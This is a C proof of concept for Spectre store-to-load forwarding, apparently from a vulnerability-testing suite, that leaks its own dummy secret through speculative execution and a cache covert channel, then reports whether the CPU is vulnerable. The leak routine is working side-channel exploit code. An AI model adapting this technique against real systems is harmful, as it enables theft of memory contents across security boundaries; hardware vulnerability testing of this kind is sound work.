#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <seccomp.h>
#include <linux/seccomp.h>

#include "libcache/cache.h"
#include "lib/global.h"

// inaccessible (overwritten) secret
#define SECRET "SECRETSS"
#define OVERWRITE '#'

char *data;

char access_array(int x)
{
    // store secret in data
    strcpy(data, SECRET);

    // flushing the data which is used in the condition increases
    // probability of speculation
    mfence();
    char **data_slowptr = &data;
    char ***data_slowslowptr = &data_slowptr;
    mfence();
    flush(&x);
    flush(data_slowptr);
    flush(&data_slowptr);
    flush(data_slowslowptr);
    flush(&data_slowslowptr);
    // ensure data is flushed at this point
    mfence();

    // overwrite data via different pointer
    // pointer chasing makes this extremely slow
    (*(*data_slowslowptr))[x] = OVERWRITE;

    // data[x] should now be "#"
    // uncomment next line to break attack
    //mfence();
    // Encode stale value in the cache
    cache_encode(data[x]);
}

int main(int argc, char **argv)
{
    PREPARE();

    data = malloc(128);
    // store secret
    strcpy(data, SECRET);

    // Flush our shared memory
    flush_shared_memory();

    // nothing leaked so far
    char leaked[sizeof(SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;

    int j = 0;
    start_time = clock();
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // for every byte in the string
        j = (j + 1) % sizeof(SECRET);

        // overwrite value with X, then access
        access_array(j);

        mfence(); // avoid speculation
        // Recover data from covert channel
        cache_decode_array(leaked, j);
        if (clock() - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Spectre_STL: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    for (int i = 0; i < sizeof(SECRET) - 1; i++)
    {
        if (SECRET[i] == leaked[i])
        {
            passed_count++;
        }
    }
    // puts(leaked);
    int exit_result = 0;
    if (passed_count > 0)
    {
        printf(ANSI_COLOR_RED "Spectre_STL: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Spectre_STL: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    exit(exit_result);
}
